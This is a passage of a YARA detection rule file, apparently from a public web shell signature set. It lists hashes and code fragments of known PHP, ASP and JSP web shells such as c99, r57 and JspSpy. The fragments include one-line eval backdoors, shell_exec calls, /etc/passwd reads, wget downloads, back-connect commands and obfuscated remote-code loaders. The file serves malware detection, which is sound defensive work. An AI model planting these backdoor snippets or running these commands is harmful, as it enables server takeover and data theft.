		hash3 = "911195a9b7c010f61b66439d9048f400"
		hash4 = "697dae78c040150daff7db751fc0c03c"
		hash5 = "513b7be8bd0595c377283a7c87b44b2e"
		hash6 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash7 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash8 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash9 = "41af6fd253648885c7ad2ed524e0692d"
		hash10 = "6fcc283470465eed4870bcc3e2d7f14d"
	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"
	condition:
		all of them
}
rule webshell_itsec_PHPJackal_itsecteam_shell_jHn {
	meta:
		description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "e2830d3286001d1455479849aacbbb38"
		hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash3 = "40c6ecf77253e805ace85f119fe1cebb"
	strings:
		$s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
		$s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
		$s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"
	condition:
		2 of them
}
rule webshell_Shell_ci_Biz_was_here_c100_v_xxx {
	meta:
		description = "Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "f2fa878de03732fbf5c86d656467ff50"
		hash1 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
	strings:
		$s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri"
		$s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\""
		$s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
		$s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de"
		$s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER"
	condition:
		2 of them
}
rule webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_xxx1 {
	meta:
		description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "f3ca29b7999643507081caab926e2e74"
		hash2 = "527cf81f9272919bf872007e21c4bdda"
	strings:
		$s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
		$s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
		$s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
		$s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
	condition:
		2 of them
}
rule webshell_c99_c99shell_c99_w4cking_Shell_xxx {
	meta:
		description = "Web Shell - from files c99.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, acid.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "9c34adbc8fd8d908cbb341734830f971"
		hash3 = "f2fa878de03732fbf5c86d656467ff50"
		hash4 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash5 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash6 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash7 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash8 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash9 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s0 = "echo \"<b>HEXDUMP:</b><nobr>"
		$s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
		$s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r"
		$s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB "
		$s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
		$s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>"
	condition:
		2 of them
}
rule webshell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$this -> addFile($content, $filename);" fullword
		$s3 = "function addFile($data, $name, $time = 0) {" fullword
		$s8 = "function unix2DosTime($unixtime = 0) {" fullword
		$s9 = "foreach($filelist as $filename){" fullword
	condition:
		all of them
}
rule webshell_c99_c66_c99_shadows_mod_c99shell {
	meta:
		description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv"
		$s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
		$s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66"
		$s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources"
		$s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos"
		$s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!"
	condition:
		2 of them
}
rule webshell_he1p_JspSpy_nogfw_ok_style_1_JspSpy1 {
	meta:
		description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b330a6c2d49124ef0729539761d6ef0b"
		hash1 = "d71716df5042880ef84427acee8b121e"
		hash2 = "344f9073576a066142b2023629539ebd"
		hash3 = "32dea47d9c13f9000c4c807561341bee"
		hash4 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash5 = "3ea688e3439a1f56b16694667938316d"
		hash6 = "2434a7a07cb47ce25b41d30bc291cacc"
	strings:
		$s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
		$s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
		$s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
		$s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"
	condition:
		2 of them
}
rule webshell_000_403_c5_config_myxx_queryDong_spyjsp2010_zend {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash4 = "e0354099bee243702eb11df8d0e046df"
		hash5 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash6 = "655722eaa6c646437c8ae93daac46ae0"
		hash7 = "591ca89a25f06cf01e4345f98a22845c"
	strings:
		$s0 = "return new Double(format.format(value)).doubleValue();" fullword
		$s5 = "File tempF = new File(savePath);" fullword
		$s9 = "if (tempF.isDirectory()) {" fullword
	condition:
		2 of them
}
rule webshell_c99_c99shell_c99_c99shell {
	meta:
		description = "Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s2 = "$bindport_pass = \"c99\";" fullword
		$s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr"
	condition:
		1 of them
}
rule webshell_r57shell127_r57_iFX_r57_kartal_r57_antichat {
	meta:
		description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "513b7be8bd0595c377283a7c87b44b2e"
		hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash4 = "3f71175985848ee46cc13282fbed2269"
	strings:
		$s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
		$s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
		$s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
		$s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
	condition:
		2 of them
}
rule webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx {
	meta:
		description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "4745d510fed4378e4b1730f56f25e569"
		hash2 = "f3ca29b7999643507081caab926e2e74"
		hash3 = "46a18979750fa458a04343cf58faa9bd"
	strings:
		$s3 = "BODY, TD, TR {" fullword
		$s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
		$s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
	condition:
		2 of them
}
rule webshell_000_403_807_a_c5_config_css_dm_he1p_xxx {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "6acc82544be056580c3a1caaa4999956"
		hash23 = "6aa32a6392840e161a018f3907a86968"
		hash24 = "591ca89a25f06cf01e4345f98a22845c"
		hash25 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash26 = "3ea688e3439a1f56b16694667938316d"
		hash27 = "ab77e4d1006259d7cbc15884416ca88c"
		hash28 = "71097537a91fac6b01f46f66ee2d7749"
		hash29 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash30 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s3 = "String savePath = request.getParameter(\"savepath\");" fullword
		$s4 = "URL downUrl = new URL(downFileUrl);" fullword
		$s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
		$s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
		$s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
		$s8 = "URLConnection conn = downUrl.openConnection();" fullword
		$s9 = "sis = request.getInputStream();" fullword
	condition:
		4 of them
}
rule webshell_2_520_icesword_job_ma1 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
	strings:
		$s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
		$s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
		$s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
	condition:
		2 of them
}
rule webshell_404_data_in_JFolder_jfolder01_jsp_suiyue_warn {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash7 = "e9a5280f77537e23da2545306f6a19ad"
	strings:
		$s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
		$s2 = " KB </td>" fullword
		$s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
		$s4 = "<!-- <tr align=\"center\"> " fullword
	condition:
		all of them
}

rule webshell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_PHPSPY {
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "40a1f840111996ff7200d18968e42cfe"
		hash3 = "0712e3dc262b4e1f98ed25760b206836"
	strings:
		$s4 = "http://www.4ngel.net" fullword
		$s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
		$s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
		$s9 = "Codz by Angel" fullword
	condition:
		2 of them
}
rule webshell_c99_locus7s_c99_w4cking_xxx {
	meta:
		description = "Web Shell - from files c99_locus7s.php, c99_w4cking.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, acid.php, newsh.php, r57.php, Backdoor.PHP.Agent.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "38fd7e45f9c11a37463c3ded1c76af4c"
		hash1 = "9c34adbc8fd8d908cbb341734830f971"
		hash2 = "ef43fef943e9df90ddb6257950b3538f"
		hash3 = "ae025c886fbe7f9ed159f49593674832"
		hash4 = "911195a9b7c010f61b66439d9048f400"
		hash5 = "697dae78c040150daff7db751fc0c03c"
		hash6 = "513b7be8bd0595c377283a7c87b44b2e"
		hash7 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash8 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash9 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash10 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash11 = "0d2c2c151ed839e6bafc7aa9c69be715"
		hash12 = "41af6fd253648885c7ad2ed524e0692d"
		hash13 = "6fcc283470465eed4870bcc3e2d7f14d"
	strings:
		$s1 = "$res = @shell_exec($cfe);" fullword
		$s8 = "$res = @ob_get_contents();" fullword
		$s9 = "@exec($cfe,$res);" fullword
	condition:
		2 of them
}
rule webshell_browser_201_3_ma_ma2_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "4b45715fa3fa5473640e17f49ef5513d"
		hash5 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
		$s2 = "private static String tempdir = \".\";" fullword
		$s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""
	condition:
		2 of them
}
rule webshell_000_403_c5_queryDong_spyjsp2010 {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"
	strings:
		$s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
		$s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
		$s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
		$s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
	condition:
		2 of them
}
rule webshell_r57shell127_r57_kartal_r57 {
	meta:
		description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash2 = "4108f28a9792b50d95f95b9e5314fa1e"
	strings:
		$s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
		$s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
		$s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"
	condition:
		2 of them
}

rule webshell_webshells_new_con2 {
	meta:
		description = "Web shells - generated from file con2.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "d3584159ab299d546bd77c9654932ae3"
	strings:
		$s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
		$s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"
	condition:
		1 of them
}
rule webshell_webshells_new_make2 {
	meta:
		description = "Web shells - generated from file make2.php"
		author = "Florian Roth"
		date = "2014/03/28"
		hash = "9af195491101e0816a263c106e4c145e"
		score = 50
	strings:
		$s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"
	condition:
		all of them
}
rule webshell_webshells_new_aaa {
	meta:
		description = "Web shells - generated from file aaa.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "68483788ab171a155db5266310c852b2"
	strings:
		$s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
		$s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
		$s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"
	condition:
		1 of them
}
rule webshell_Expdoor_com_ASP {
	meta:
		description = "Web shells - generated from file Expdoor.com ASP.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "caef01bb8906d909f24d1fa109ea18a7"
	strings:
		$s4 = "\">www.Expdoor.com</a>" fullword
		$s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
		$s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
		$s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
		$s16 = "<TITLE>Expdoor.com ASP" fullword
	condition:
		2 of them
}
rule webshell_webshells_new_php2 {
	meta:
		description = "Web shells - generated from file php2.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "fbf2e76e6f897f6f42b896c855069276"
	strings:
		$s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="
	condition:
		all of them
}
rule webshell_bypass_iisuser_p {
	meta:
		description = "Web shells - generated from file bypass-iisuser-p.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "924d294400a64fa888a79316fb3ccd90"
	strings:
		$s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"
	condition:
		all of them
}
rule webshell_sig_404super {
	meta:
		description = "Web shells - generated from file 404super.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "7ed63176226f83d36dce47ce82507b28"
	strings:
		$s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
		$s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
		$s7 = "//http://require.duapp.com/session.php" fullword
		$s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
		$s12 = "//define('pass','123456');" fullword
		$s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"
	condition:
		1 of them
}
rule webshell_webshells_new_JSP {
	meta:
		description = "Web shells - generated from file JSP.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "495f1a0a4c82f986f4bdf51ae1898ee7"
	strings:
		$s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i"
		$s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app"
		$s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest"
	condition:
		1 of them
}
rule webshell_webshell_123 {
	meta:
		description = "Web shells - generated from file webshell-123.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "2782bb170acaed3829ea9a04f0ac7218"
	strings:
		$s0 = "// Web Shell!!" fullword
		$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
		$s3 = "$default_charset = \"UTF-8\";" fullword
		$s4 = "// url:http://www.weigongkai.com/shell/" fullword
	condition:
		2 of them
}
rule webshell_dev_core {
	meta:
		description = "Web shells - generated from file dev_core.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "55ad9309b006884f660c41e53150fc2e"
	strings:
		$s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
		$s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
		$s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874"
		$s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))"
		$s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C"
		$s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))"
	condition:
		1 of them
}
rule webshell_webshells_new_pHp {
	meta:
		description = "Web shells - generated from file pHp.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "b0e842bdf83396c3ef8c71ff94e64167"
	strings:
		$s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
		$s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
		$s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
		$s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
		$s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"
	condition:
		1 of them
}
rule webshell_webshells_new_pppp {
	meta:
		description = "Web shells - generated from file pppp.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "cf01cb6e09ee594545693c5d327bdd50"
	strings:
		$s0 = "Mail: chinese@hackermail.com" fullword
		$s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "
		$s6 = "Site: http://blog.weili.me" fullword
	condition:
		1 of them
}
rule webshell_webshells_new_code {
	meta:
		description = "Web shells - generated from file code.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "a444014c134ff24c0be5a05c02b81a79"
	strings:
		$s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
		$s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
		$s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
		$s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
		$s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"
	condition:
		1 of them
}
rule webshell_webshells_new_jspyyy {
	meta:
		description = "Web shells - generated from file jspyyy.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "b291bf3ccc9dac8b5c7e1739b8fa742e"
	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"
	condition:
		all of them
}
rule webshell_webshells_new_xxxx {
	meta:
		description = "Web shells - generated from file xxxx.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "5bcba70b2137375225d8eedcde2c0ebb"
	strings:
		$s0 = "<?php eval($_POST[1]);?>  " fullword
	condition:
		all of them
}
rule webshell_webshells_new_JJjsp3 {
	meta:
		description = "Web shells - generated from file JJjsp3.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "949ffee1e07a1269df7c69b9722d293e"
	strings:
		$s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"
	condition:
		all of them
}
rule webshell_webshells_new_PHP1 {
	meta:
		description = "Web shells - generated from file PHP1.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "14c7281fdaf2ae004ca5fec8753ce3cb"
	strings:
